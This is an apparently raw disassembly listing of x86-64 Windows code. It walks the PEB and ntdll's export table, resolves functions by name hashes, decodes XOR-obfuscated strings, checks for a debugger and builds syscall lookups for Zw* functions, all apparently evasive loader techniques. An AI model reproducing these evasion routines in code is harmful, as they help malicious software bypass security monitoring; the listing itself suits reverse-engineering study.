    6d8c9c3f:	42 8a 4c 00 10       	mov    0x10(%rax,%r8,1),%cl
    6d8c9c44:	31 d9                	xor    %ebx,%ecx
    6d8c9c46:	31 f1                	xor    %esi,%ecx
    6d8c9c48:	44 31 c9             	xor    %r9d,%ecx
    6d8c9c4b:	31 d1                	xor    %edx,%ecx
    6d8c9c4d:	42 88 4c 00 10       	mov    %cl,0x10(%rax,%r8,1)
    6d8c9c52:	49 ff c0             	inc    %r8
    6d8c9c55:	eb e3                	jmp    0x6d8c9c3a
    6d8c9c57:	48 83 c4 28          	add    $0x28,%rsp
    6d8c9c5b:	5b                   	pop    %rbx
    6d8c9c5c:	5e                   	pop    %rsi
    6d8c9c5d:	c3                   	ret
    6d8c9c5e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c9c62:	48 8d 0d 77 91 00 00 	lea    0x9177(%rip),%rcx        # 0x6d8d2de0
    6d8c9c69:	ba fa d7 4d 18       	mov    $0x184dd7fa,%edx
    6d8c9c6e:	e8 9d ff ff ff       	call   0x6d8c9c10
    6d8c9c73:	48 89 c1             	mov    %rax,%rcx
    6d8c9c76:	e8 6c bf ff ff       	call   0x6d8c5be7
    6d8c9c7b:	48 89 c1             	mov    %rax,%rcx
    6d8c9c7e:	48 8b 05 0b e9 0e 00 	mov    0xee90b(%rip),%rax        # 0x6d9b8590
    6d8c9c85:	ff 10                	call   *(%rax)
    6d8c9c87:	48 8d 0d 12 91 00 00 	lea    0x9112(%rip),%rcx        # 0x6d8d2da0
    6d8c9c8e:	ba 8e fe 8a 3c       	mov    $0x3c8afe8e,%edx
    6d8c9c93:	48 89 05 96 50 10 00 	mov    %rax,0x105096(%rip)        # 0x6d9ced30
    6d8c9c9a:	e8 71 ff ff ff       	call   0x6d8c9c10
    6d8c9c9f:	48 89 c1             	mov    %rax,%rcx
    6d8c9ca2:	e8 40 bf ff ff       	call   0x6d8c5be7
    6d8c9ca7:	48 8b 0d 82 50 10 00 	mov    0x105082(%rip),%rcx        # 0x6d9ced30
    6d8c9cae:	48 89 c2             	mov    %rax,%rdx
    6d8c9cb1:	48 8b 05 b8 e8 0e 00 	mov    0xee8b8(%rip),%rax        # 0x6d9b8570
    6d8c9cb8:	ff 10                	call   *(%rax)
    6d8c9cba:	48 89 05 77 50 10 00 	mov    %rax,0x105077(%rip)        # 0x6d9ced38
    6d8c9cc1:	48 89 05 60 50 10 00 	mov    %rax,0x105060(%rip)        # 0x6d9ced28
    6d8c9cc8:	48 83 c4 28          	add    $0x28,%rsp
    6d8c9ccc:	c3                   	ret
    6d8c9ccd:	90                   	nop
    6d8c9cce:	90                   	nop
    6d8c9ccf:	90                   	nop
    6d8c9cd0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c9cd4:	b0 01                	mov    $0x1,%al
    6d8c9cd6:	48 39 d1             	cmp    %rdx,%rcx
    6d8c9cd9:	74 16                	je     0x6d8c9cf1
    6d8c9cdb:	31 c0                	xor    %eax,%eax
    6d8c9cdd:	48 85 c9             	test   %rcx,%rcx
    6d8c9ce0:	74 0f                	je     0x6d8c9cf1
    6d8c9ce2:	48 85 d2             	test   %rdx,%rdx
    6d8c9ce5:	74 0a                	je     0x6d8c9cf1
    6d8c9ce7:	e8 4c 48 00 00       	call   0x6d8ce538
    6d8c9cec:	85 c0                	test   %eax,%eax
    6d8c9cee:	0f 94 c0             	sete   %al
    6d8c9cf1:	48 83 c4 28          	add    $0x28,%rsp
    6d8c9cf5:	c3                   	ret
    6d8c9cf6:	31 c0                	xor    %eax,%eax
    6d8c9cf8:	48 85 c9             	test   %rcx,%rcx
    6d8c9cfb:	74 21                	je     0x6d8c9d1e
    6d8c9cfd:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    6d8c9d02:	75 1a                	jne    0x6d8c9d1e
    6d8c9d04:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
    6d8c9d08:	48 01 d1             	add    %rdx,%rcx
    6d8c9d0b:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
    6d8c9d11:	75 0b                	jne    0x6d8c9d1e
    6d8c9d13:	66 8b 41 16          	mov    0x16(%rcx),%ax
    6d8c9d17:	66 c1 e8 0d          	shr    $0xd,%ax
    6d8c9d1b:	83 e0 01             	and    $0x1,%eax
    6d8c9d1e:	c3                   	ret
    6d8c9d1f:	48 8d 04 91          	lea    (%rcx,%rdx,4),%rax
    6d8c9d23:	c3                   	ret
    6d8c9d24:	56                   	push   %rsi
    6d8c9d25:	53                   	push   %rbx
    6d8c9d26:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c9d2a:	48 89 d3             	mov    %rdx,%rbx
    6d8c9d2d:	e8 0a af ff ff       	call   0x6d8c4c3c
    6d8c9d32:	48 85 c0             	test   %rax,%rax
    6d8c9d35:	74 34                	je     0x6d8c9d6b
    6d8c9d37:	4c 8b 10             	mov    (%rax),%r10
    6d8c9d3a:	49 89 d9             	mov    %rbx,%r9
    6d8c9d3d:	48 89 da             	mov    %rbx,%rdx
    6d8c9d40:	0f b6 f7             	movzbl %bh,%esi
    6d8c9d43:	49 c1 f9 10          	sar    $0x10,%r9
    6d8c9d47:	48 c1 fa 18          	sar    $0x18,%rdx
    6d8c9d4b:	45 31 c0             	xor    %r8d,%r8d
    6d8c9d4e:	4d 39 d0             	cmp    %r10,%r8
    6d8c9d51:	7d 18                	jge    0x6d8c9d6b
    6d8c9d53:	42 8a 4c 00 10       	mov    0x10(%rax,%r8,1),%cl
    6d8c9d58:	31 d9                	xor    %ebx,%ecx
    6d8c9d5a:	31 f1                	xor    %esi,%ecx
    6d8c9d5c:	44 31 c9             	xor    %r9d,%ecx
    6d8c9d5f:	31 d1                	xor    %edx,%ecx
    6d8c9d61:	42 88 4c 00 10       	mov    %cl,0x10(%rax,%r8,1)
    6d8c9d66:	49 ff c0             	inc    %r8
    6d8c9d69:	eb e3                	jmp    0x6d8c9d4e
    6d8c9d6b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c9d6f:	5b                   	pop    %rbx
    6d8c9d70:	5e                   	pop    %rsi
    6d8c9d71:	c3                   	ret
    6d8c9d72:	48 c1 e2 02          	shl    $0x2,%rdx
    6d8c9d76:	48 89 c8             	mov    %rcx,%rax
    6d8c9d79:	48 29 d0             	sub    %rdx,%rax
    6d8c9d7c:	c3                   	ret
    6d8c9d7d:	41 57                	push   %r15
    6d8c9d7f:	41 56                	push   %r14
    6d8c9d81:	41 55                	push   %r13
    6d8c9d83:	41 54                	push   %r12
    6d8c9d85:	55                   	push   %rbp
    6d8c9d86:	57                   	push   %rdi
    6d8c9d87:	56                   	push   %rsi
    6d8c9d88:	53                   	push   %rbx
    6d8c9d89:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
    6d8c9d90:	31 c0                	xor    %eax,%eax
    6d8c9d92:	4c 89 c5             	mov    %r8,%rbp
    6d8c9d95:	48 89 cb             	mov    %rcx,%rbx
    6d8c9d98:	b9 20 00 00 00       	mov    $0x20,%ecx
    6d8c9d9d:	44 89 8c 24 18 01 00 	mov    %r9d,0x118(%rsp)
    6d8c9da4:	00 
    6d8c9da5:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
    6d8c9daa:	49 89 d6             	mov    %rdx,%r14
    6d8c9dad:	4c 89 c7             	mov    %r8,%rdi
    6d8c9db0:	f3 ab                	rep stos %eax,(%rdi)
    6d8c9db2:	48 89 d9             	mov    %rbx,%rcx
    6d8c9db5:	e8 3c ff ff ff       	call   0x6d8c9cf6
    6d8c9dba:	85 c0                	test   %eax,%eax
    6d8c9dbc:	75 07                	jne    0x6d8c9dc5
    6d8c9dbe:	31 c0                	xor    %eax,%eax
    6d8c9dc0:	e9 5d 01 00 00       	jmp    0x6d8c9f22
    6d8c9dc5:	48 63 43 3c          	movslq 0x3c(%rbx),%rax
    6d8c9dc9:	b9 20 00 00 00       	mov    $0x20,%ecx
    6d8c9dce:	4c 89 c7             	mov    %r8,%rdi
    6d8c9dd1:	48 8d b4 03 88 00 00 	lea    0x88(%rbx,%rax,1),%rsi
    6d8c9dd8:	00 
    6d8c9dd9:	f3 a5                	rep movsl (%rsi),(%rdi)
    6d8c9ddb:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
    6d8c9de0:	74 dc                	je     0x6d8c9dbe
    6d8c9de2:	48 63 74 24 30       	movslq 0x30(%rsp),%rsi
    6d8c9de7:	85 f6                	test   %esi,%esi
    6d8c9de9:	74 d3                	je     0x6d8c9dbe
    6d8c9deb:	48 8d 15 0e 90 00 00 	lea    0x900e(%rip),%rdx        # 0x6d8d2e00
    6d8c9df2:	48 01 de             	add    %rbx,%rsi
    6d8c9df5:	4c 89 f1             	mov    %r14,%rcx
    6d8c9df8:	4c 63 4e 1c          	movslq 0x1c(%rsi),%r9
    6d8c9dfc:	4d 8d 24 19          	lea    (%r9,%rbx,1),%r12
    6d8c9e00:	e8 cb fe ff ff       	call   0x6d8c9cd0
    6d8c9e05:	84 c0                	test   %al,%al
    6d8c9e07:	75 1a                	jne    0x6d8c9e23
    6d8c9e09:	48 63 46 20          	movslq 0x20(%rsi),%rax
    6d8c9e0d:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
    6d8c9e14:	00 
    6d8c9e15:	44 8b 6e 18          	mov    0x18(%rsi),%r13d
    6d8c9e19:	41 8b 2c 24          	mov    (%r12),%ebp
    6d8c9e1d:	44 8b 3c 18          	mov    (%rax,%rbx,1),%r15d
    6d8c9e21:	eb 6b                	jmp    0x6d8c9e8e
    6d8c9e23:	49 63 44 ac fc       	movslq -0x4(%r12,%rbp,4),%rax
    6d8c9e28:	e9 f2 00 00 00       	jmp    0x6d8c9f1f
    6d8c9e2d:	48 8b 05 3c e8 0e 00 	mov    0xee83c(%rip),%rax        # 0x6d9b8670
    6d8c9e34:	4d 63 d7             	movslq %r15d,%r10
    6d8c9e37:	31 d2                	xor    %edx,%edx
    6d8c9e39:	4c 8d 05 c1 8f 00 00 	lea    0x8fc1(%rip),%r8        # 0x6d8d2e01
    6d8c9e40:	49 01 da             	add    %rbx,%r10
    6d8c9e43:	4c 89 d1             	mov    %r10,%rcx
    6d8c9e46:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
    6d8c9e4b:	ff 10                	call   *(%rax)
    6d8c9e4d:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
    6d8c9e52:	48 85 c0             	test   %rax,%rax
    6d8c9e55:	75 43                	jne    0x6d8c9e9a
    6d8c9e57:	49 83 c4 04          	add    $0x4,%r12
    6d8c9e5b:	41 8b 34 24          	mov    (%r12),%esi
    6d8c9e5f:	4d 85 d2             	test   %r10,%r10
    6d8c9e62:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c9e67:	74 0d                	je     0x6d8c9e76
    6d8c9e69:	31 c0                	xor    %eax,%eax
    6d8c9e6b:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c9e6f:	4c 89 d7             	mov    %r10,%rdi
    6d8c9e72:	f2 ae                	repnz scas (%rdi),%al
    6d8c9e74:	f7 d1                	not    %ecx
    6d8c9e76:	41 01 cf             	add    %ecx,%r15d
    6d8c9e79:	4c 89 d2             	mov    %r10,%rdx
    6d8c9e7c:	4c 89 f1             	mov    %r14,%rcx
    6d8c9e7f:	e8 4c fe ff ff       	call   0x6d8c9cd0
    6d8c9e84:	84 c0                	test   %al,%al
    6d8c9e86:	75 19                	jne    0x6d8c9ea1
    6d8c9e88:	ff 44 24 24          	incl   0x24(%rsp)
    6d8c9e8c:	89 f5                	mov    %esi,%ebp
    6d8c9e8e:	44 3b 6c 24 24       	cmp    0x24(%rsp),%r13d
    6d8c9e93:	7d 98                	jge    0x6d8c9e2d
    6d8c9e95:	e9 24 ff ff ff       	jmp    0x6d8c9dbe
    6d8c9e9a:	41 ff c5             	inc    %r13d
    6d8c9e9d:	89 ee                	mov    %ebp,%esi
    6d8c9e9f:	eb be                	jmp    0x6d8c9e5f
    6d8c9ea1:	48 8d 0d 98 90 00 00 	lea    0x9098(%rip),%rcx        # 0x6d8d2f40
    6d8c9ea8:	ba 8e fe 8a 3c       	mov    $0x3c8afe8e,%edx
    6d8c9ead:	e8 72 fe ff ff       	call   0x6d8c9d24
    6d8c9eb2:	ba 8a b9 ce 5c       	mov    $0x5cceb98a,%edx
    6d8c9eb7:	48 8d 0d 42 90 00 00 	lea    0x9042(%rip),%rcx        # 0x6d8d2f00
    6d8c9ebe:	e8 61 fe ff ff       	call   0x6d8c9d24
    6d8c9ec3:	ba 3e 14 6e 23       	mov    $0x236e143e,%edx
    6d8c9ec8:	48 8d 0d 11 90 00 00 	lea    0x9011(%rip),%rcx        # 0x6d8d2ee0
    6d8c9ecf:	e8 50 fe ff ff       	call   0x6d8c9d24
    6d8c9ed4:	ba 9a dd 49 04       	mov    $0x449dd9a,%edx
    6d8c9ed9:	48 8d 0d c0 8f 00 00 	lea    0x8fc0(%rip),%rcx        # 0x6d8d2ea0
    6d8c9ee0:	e8 3f fe ff ff       	call   0x6d8c9d24
    6d8c9ee5:	ba 6e d9 47 5a       	mov    $0x5a47d96e,%edx
    6d8c9eea:	48 8d 0d 6f 8f 00 00 	lea    0x8f6f(%rip),%rcx        # 0x6d8d2e60
    6d8c9ef1:	e8 2e fe ff ff       	call   0x6d8c9d24
    6d8c9ef6:	ba 2a 48 1b 0d       	mov    $0xd1b482a,%edx
    6d8c9efb:	48 8d 0d 3e 8f 00 00 	lea    0x8f3e(%rip),%rcx        # 0x6d8d2e40
    6d8c9f02:	e8 1d fe ff ff       	call   0x6d8c9d24
    6d8c9f07:	8b 8c 24 18 01 00 00 	mov    0x118(%rsp),%ecx
    6d8c9f0e:	e8 3d b7 ff ff       	call   0x6d8c5650
    6d8c9f13:	84 c0                	test   %al,%al
    6d8c9f15:	75 05                	jne    0x6d8c9f1c
    6d8c9f17:	48 63 c5             	movslq %ebp,%rax
    6d8c9f1a:	eb 03                	jmp    0x6d8c9f1f
    6d8c9f1c:	48 63 c6             	movslq %esi,%rax
    6d8c9f1f:	48 01 d8             	add    %rbx,%rax
    6d8c9f22:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
    6d8c9f29:	5b                   	pop    %rbx
    6d8c9f2a:	5e                   	pop    %rsi
    6d8c9f2b:	5f                   	pop    %rdi
    6d8c9f2c:	5d                   	pop    %rbp
    6d8c9f2d:	41 5c                	pop    %r12
    6d8c9f2f:	41 5d                	pop    %r13
    6d8c9f31:	41 5e                	pop    %r14
    6d8c9f33:	41 5f                	pop    %r15
    6d8c9f35:	c3                   	ret
    6d8c9f36:	55                   	push   %rbp
    6d8c9f37:	57                   	push   %rdi
    6d8c9f38:	56                   	push   %rsi
    6d8c9f39:	53                   	push   %rbx
    6d8c9f3a:	48 83 ec 58          	sub    $0x58,%rsp
    6d8c9f3e:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
    6d8c9f45:	00 00 
    6d8c9f47:	48 8b 40 18          	mov    0x18(%rax),%rax
    6d8c9f4b:	48 8b 58 20          	mov    0x20(%rax),%rbx
    6d8c9f4f:	48 8d 68 20          	lea    0x20(%rax),%rbp
    6d8c9f53:	48 89 ce             	mov    %rcx,%rsi
    6d8c9f56:	89 d7                	mov    %edx,%edi
    6d8c9f58:	48 8b 05 21 e6 0e 00 	mov    0xee621(%rip),%rax        # 0x6d9b8580
    6d8c9f5f:	48 89 f1             	mov    %rsi,%rcx
    6d8c9f62:	48 8b 53 50          	mov    0x50(%rbx),%rdx
    6d8c9f66:	ff 10                	call   *(%rax)
    6d8c9f68:	85 c0                	test   %eax,%eax
    6d8c9f6a:	74 0a                	je     0x6d8c9f76
    6d8c9f6c:	48 8b 1b             	mov    (%rbx),%rbx
    6d8c9f6f:	48 39 dd             	cmp    %rbx,%rbp
    6d8c9f72:	75 e4                	jne    0x6d8c9f58
    6d8c9f74:	eb 09                	jmp    0x6d8c9f7f
    6d8c9f76:	48 8b 43 20          	mov    0x20(%rbx),%rax
    6d8c9f7a:	e9 85 00 00 00       	jmp    0x6d8ca004
    6d8c9f7f:	85 ff                	test   %edi,%edi
    6d8c9f81:	75 04                	jne    0x6d8c9f87
    6d8c9f83:	31 c0                	xor    %eax,%eax
    6d8c9f85:	eb 7d                	jmp    0x6d8ca004
    6d8c9f87:	48 8d 0d 92 8e 00 00 	lea    0x8e92(%rip),%rcx        # 0x6d8d2e20
    6d8c9f8e:	e8 db bc ff ff       	call   0x6d8c5c6e
    6d8c9f93:	31 d2                	xor    %edx,%edx
    6d8c9f95:	48 89 c1             	mov    %rax,%rcx
    6d8c9f98:	e8 99 ff ff ff       	call   0x6d8c9f36
    6d8c9f9d:	45 31 c0             	xor    %r8d,%r8d
    6d8c9fa0:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6d8c9fa6:	48 8d 15 56 8e 00 00 	lea    0x8e56(%rip),%rdx        # 0x6d8d2e03
    6d8c9fad:	48 89 c1             	mov    %rax,%rcx
    6d8c9fb0:	e8 c8 fd ff ff       	call   0x6d8c9d7d
    6d8c9fb5:	48 85 c0             	test   %rax,%rax
    6d8c9fb8:	48 89 c3             	mov    %rax,%rbx
    6d8c9fbb:	74 c6                	je     0x6d8c9f83
    6d8c9fbd:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
    6d8c9fc2:	31 c0                	xor    %eax,%eax
    6d8c9fc4:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8c9fc9:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6d8c9fd0:	00 00 
    6d8c9fd2:	4c 89 c7             	mov    %r8,%rdi
    6d8c9fd5:	48 89 f2             	mov    %rsi,%rdx
    6d8c9fd8:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
    6d8c9fdd:	f3 ab                	rep stos %eax,(%rdi)
    6d8c9fdf:	48 8b 05 7a e5 0e 00 	mov    0xee57a(%rip),%rax        # 0x6d9b8560
    6d8c9fe6:	4c 89 c1             	mov    %r8,%rcx
    6d8c9fe9:	ff 10                	call   *(%rax)
    6d8c9feb:	31 d2                	xor    %edx,%edx
    6d8c9fed:	31 c9                	xor    %ecx,%ecx
    6d8c9fef:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
    6d8c9ff4:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
    6d8c9ff9:	ff d3                	call   *%rbx
    6d8c9ffb:	85 c0                	test   %eax,%eax
    6d8c9ffd:	75 84                	jne    0x6d8c9f83
    6d8c9fff:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
    6d8ca004:	48 83 c4 58          	add    $0x58,%rsp
    6d8ca008:	5b                   	pop    %rbx
    6d8ca009:	5e                   	pop    %rsi
    6d8ca00a:	5f                   	pop    %rdi
    6d8ca00b:	5d                   	pop    %rbp
    6d8ca00c:	c3                   	ret
    6d8ca00d:	90                   	nop
    6d8ca00e:	90                   	nop
    6d8ca00f:	90                   	nop
    6d8ca010:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca014:	31 c0                	xor    %eax,%eax
    6d8ca016:	65 48 8b 14 25 60 00 	mov    %gs:0x60,%rdx
    6d8ca01d:	00 00 
    6d8ca01f:	80 7a 02 00          	cmpb   $0x0,0x2(%rdx)
    6d8ca023:	74 13                	je     0x6d8ca038
    6d8ca025:	48 8d 0d 34 8f 00 00 	lea    0x8f34(%rip),%rcx        # 0x6d8d2f60
    6d8ca02c:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8ca031:	e8 48 7a ff ff       	call   0x6d8c1a7e
    6d8ca036:	b0 01                	mov    $0x1,%al
    6d8ca038:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca03c:	c3                   	ret
    6d8ca03d:	90                   	nop
    6d8ca03e:	90                   	nop
    6d8ca03f:	90                   	nop
    6d8ca040:	b8 87 c1 f3 ff       	mov    $0xfff3c187,%eax
    6d8ca045:	31 d2                	xor    %edx,%edx
    6d8ca047:	41 89 d0             	mov    %edx,%r8d
    6d8ca04a:	42 80 3c 01 00       	cmpb   $0x0,(%rcx,%r8,1)
    6d8ca04f:	74 16                	je     0x6d8ca067
    6d8ca051:	46 0f b7 04 01       	movzwl (%rcx,%r8,1),%r8d
    6d8ca056:	41 89 c1             	mov    %eax,%r9d
    6d8ca059:	ff c2                	inc    %edx
    6d8ca05b:	41 c1 c9 08          	ror    $0x8,%r9d
    6d8ca05f:	45 01 c8             	add    %r9d,%r8d
    6d8ca062:	44 31 c0             	xor    %r8d,%eax
    6d8ca065:	eb e0                	jmp    0x6d8ca047
    6d8ca067:	c3                   	ret
    6d8ca068:	41 54                	push   %r12
    6d8ca06a:	55                   	push   %rbp
    6d8ca06b:	57                   	push   %rdi
    6d8ca06c:	56                   	push   %rsi
    6d8ca06d:	53                   	push   %rbx
    6d8ca06e:	48 83 ec 30          	sub    $0x30,%rsp
    6d8ca072:	41 b8 03 00 00 00    	mov    $0x3,%r8d
    6d8ca078:	48 8d 59 12          	lea    0x12(%rcx),%rbx
    6d8ca07c:	48 89 ce             	mov    %rcx,%rsi
    6d8ca07f:	66 c7 44 24 2d 0f 05 	movw   $0x50f,0x2d(%rsp)
    6d8ca086:	48 8d 6c 24 2d       	lea    0x2d(%rsp),%rbp
    6d8ca08b:	48 89 da             	mov    %rbx,%rdx
    6d8ca08e:	c6 44 24 2f c3       	movb   $0xc3,0x2f(%rsp)
    6d8ca093:	48 89 e9             	mov    %rbp,%rcx
    6d8ca096:	e8 bd 44 00 00       	call   0x6d8ce558
    6d8ca09b:	85 c0                	test   %eax,%eax
    6d8ca09d:	74 4f                	je     0x6d8ca0ee
    6d8ca09f:	48 8d 7e 32          	lea    0x32(%rsi),%rdi
    6d8ca0a3:	4c 8d 66 f2          	lea    -0xe(%rsi),%r12
    6d8ca0a7:	48 81 c6 12 40 00 00 	add    $0x4012,%rsi
    6d8ca0ae:	41 b8 03 00 00 00    	mov    $0x3,%r8d
    6d8ca0b4:	48 89 fa             	mov    %rdi,%rdx
    6d8ca0b7:	48 89 e9             	mov    %rbp,%rcx
    6d8ca0ba:	e8 99 44 00 00       	call   0x6d8ce558
    6d8ca0bf:	48 89 fb             	mov    %rdi,%rbx
    6d8ca0c2:	85 c0                	test   %eax,%eax
    6d8ca0c4:	74 28                	je     0x6d8ca0ee
    6d8ca0c6:	41 b8 03 00 00 00    	mov    $0x3,%r8d
    6d8ca0cc:	4c 89 e2             	mov    %r12,%rdx
    6d8ca0cf:	48 89 e9             	mov    %rbp,%rcx
    6d8ca0d2:	e8 81 44 00 00       	call   0x6d8ce558
    6d8ca0d7:	4c 89 e3             	mov    %r12,%rbx
    6d8ca0da:	85 c0                	test   %eax,%eax
    6d8ca0dc:	74 10                	je     0x6d8ca0ee
    6d8ca0de:	4d 8d 64 24 e0       	lea    -0x20(%r12),%r12
    6d8ca0e3:	48 83 c7 20          	add    $0x20,%rdi
    6d8ca0e7:	48 39 f7             	cmp    %rsi,%rdi
    6d8ca0ea:	75 c2                	jne    0x6d8ca0ae
    6d8ca0ec:	31 db                	xor    %ebx,%ebx
    6d8ca0ee:	48 89 d8             	mov    %rbx,%rax
    6d8ca0f1:	48 83 c4 30          	add    $0x30,%rsp
    6d8ca0f5:	5b                   	pop    %rbx
    6d8ca0f6:	5e                   	pop    %rsi
    6d8ca0f7:	5f                   	pop    %rdi
    6d8ca0f8:	5d                   	pop    %rbp
    6d8ca0f9:	41 5c                	pop    %r12
    6d8ca0fb:	c3                   	ret
    6d8ca0fc:	41 57                	push   %r15
    6d8ca0fe:	41 56                	push   %r14
    6d8ca100:	41 55                	push   %r13
    6d8ca102:	41 54                	push   %r12
    6d8ca104:	55                   	push   %rbp
    6d8ca105:	57                   	push   %rdi
    6d8ca106:	56                   	push   %rsi
    6d8ca107:	53                   	push   %rbx
    6d8ca108:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca10c:	83 3d 6d 4f 00 00 00 	cmpl   $0x0,0x4f6d(%rip)        # 0x6d8cf080
    6d8ca113:	74 0a                	je     0x6d8ca11f
    6d8ca115:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8ca11a:	e9 59 01 00 00       	jmp    0x6d8ca278
    6d8ca11f:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
    6d8ca126:	00 00 
    6d8ca128:	48 8b 40 18          	mov    0x18(%rax),%rax
    6d8ca12c:	45 31 c0             	xor    %r8d,%r8d
    6d8ca12f:	31 d2                	xor    %edx,%edx
    6d8ca131:	48 8b 48 10          	mov    0x10(%rax),%rcx
    6d8ca135:	48 8b 59 30          	mov    0x30(%rcx),%rbx
    6d8ca139:	48 85 db             	test   %rbx,%rbx
    6d8ca13c:	74 44                	je     0x6d8ca182
    6d8ca13e:	48 63 43 3c          	movslq 0x3c(%rbx),%rax
    6d8ca142:	8b 84 03 88 00 00 00 	mov    0x88(%rbx,%rax,1),%eax
    6d8ca149:	85 c0                	test   %eax,%eax
    6d8ca14b:	74 2d                	je     0x6d8ca17a
    6d8ca14d:	89 c2                	mov    %eax,%edx
    6d8ca14f:	48 01 da             	add    %rbx,%rdx
    6d8ca152:	8b 42 0c             	mov    0xc(%rdx),%eax
    6d8ca155:	48 01 d8             	add    %rbx,%rax
    6d8ca158:	44 8b 00             	mov    (%rax),%r8d
    6d8ca15b:	41 81 c8 20 20 20 20 	or     $0x20202020,%r8d
    6d8ca162:	41 81 f8 6e 74 64 6c 	cmp    $0x6c64746e,%r8d
    6d8ca169:	75 0f                	jne    0x6d8ca17a
    6d8ca16b:	8b 40 04             	mov    0x4(%rax),%eax
    6d8ca16e:	0d 20 20 20 20       	or     $0x20202020,%eax
    6d8ca173:	3d 6c 2e 64 6c       	cmp    $0x6c642e6c,%eax
    6d8ca178:	74 16                	je     0x6d8ca190
    6d8ca17a:	48 8b 09             	mov    (%rcx),%rcx
    6d8ca17d:	49 89 d8             	mov    %rbx,%r8
    6d8ca180:	eb b3                	jmp    0x6d8ca135
    6d8ca182:	31 c0                	xor    %eax,%eax
    6d8ca184:	48 85 d2             	test   %rdx,%rdx
    6d8ca187:	0f 84 eb 00 00 00    	je     0x6d8ca278
    6d8ca18d:	4c 89 c3             	mov    %r8,%rbx
    6d8ca190:	8b 42 18             	mov    0x18(%rdx),%eax
    6d8ca193:	4c 8d 35 ee 4e 00 00 	lea    0x4eee(%rip),%r14        # 0x6d8cf088
    6d8ca19a:	31 f6                	xor    %esi,%esi
    6d8ca19c:	44 8b 62 24          	mov    0x24(%rdx),%r12d
    6d8ca1a0:	44 8b 6a 1c          	mov    0x1c(%rdx),%r13d
    6d8ca1a4:	8d 78 ff             	lea    -0x1(%rax),%edi
    6d8ca1a7:	8b 42 20             	mov    0x20(%rdx),%eax
    6d8ca1aa:	49 01 dc             	add    %rbx,%r12
    6d8ca1ad:	49 01 dd             	add    %rbx,%r13
    6d8ca1b0:	48 01 d8             	add    %rbx,%rax
    6d8ca1b3:	4c 8d 3c b8          	lea    (%rax,%rdi,4),%r15
    6d8ca1b7:	48 01 ff             	add    %rdi,%rdi
    6d8ca1ba:	4c 01 e7             	add    %r12,%rdi
    6d8ca1bd:	41 8b 0f             	mov    (%r15),%ecx
    6d8ca1c0:	48 01 d9             	add    %rbx,%rcx
    6d8ca1c3:	66 81 39 5a 77       	cmpw   $0x775a,(%rcx)
    6d8ca1c8:	75 32                	jne    0x6d8ca1fc
    6d8ca1ca:	e8 71 fe ff ff       	call   0x6d8ca040
    6d8ca1cf:	89 f5                	mov    %esi,%ebp
    6d8ca1d1:	ff c6                	inc    %esi
    6d8ca1d3:	48 c1 e5 04          	shl    $0x4,%rbp
    6d8ca1d7:	4c 01 f5             	add    %r14,%rbp
    6d8ca1da:	89 45 00             	mov    %eax,0x0(%rbp)
    6d8ca1dd:	0f b7 07             	movzwl (%rdi),%eax
    6d8ca1e0:	41 8b 4c 85 00       	mov    0x0(%r13,%rax,4),%ecx
    6d8ca1e5:	89 4d 04             	mov    %ecx,0x4(%rbp)
    6d8ca1e8:	48 01 d9             	add    %rbx,%rcx
    6d8ca1eb:	e8 78 fe ff ff       	call   0x6d8ca068
    6d8ca1f0:	81 fe f4 01 00 00    	cmp    $0x1f4,%esi
    6d8ca1f6:	48 89 45 08          	mov    %rax,0x8(%rbp)
    6d8ca1fa:	74 12                	je     0x6d8ca20e
    6d8ca1fc:	48 8d 47 fe          	lea    -0x2(%rdi),%rax
    6d8ca200:	49 83 ef 04          	sub    $0x4,%r15
    6d8ca204:	49 39 fc             	cmp    %rdi,%r12
    6d8ca207:	74 05                	je     0x6d8ca20e
    6d8ca209:	48 89 c7             	mov    %rax,%rdi
    6d8ca20c:	eb af                	jmp    0x6d8ca1bd
    6d8ca20e:	89 35 6c 4e 00 00    	mov    %esi,0x4e6c(%rip)        # 0x6d8cf080
    6d8ca214:	4c 8d 15 6d 4e 00 00 	lea    0x4e6d(%rip),%r10        # 0x6d8cf088
    6d8ca21b:	ff ce                	dec    %esi
    6d8ca21d:	85 f6                	test   %esi,%esi
    6d8ca21f:	0f 84 f0 fe ff ff    	je     0x6d8ca115
    6d8ca225:	48 8d 15 54 4e 00 00 	lea    0x4e54(%rip),%rdx        # 0x6d8cf080
    6d8ca22c:	31 c9                	xor    %ecx,%ecx
    6d8ca22e:	39 f1                	cmp    %esi,%ecx
    6d8ca230:	73 42                	jae    0x6d8ca274
    6d8ca232:	8d 41 01             	lea    0x1(%rcx),%eax
    6d8ca235:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
    6d8ca239:	48 89 c1             	mov    %rax,%rcx
    6d8ca23c:	48 c1 e0 04          	shl    $0x4,%rax
    6d8ca240:	4c 01 d0             	add    %r10,%rax
    6d8ca243:	44 8b 48 04          	mov    0x4(%rax),%r9d
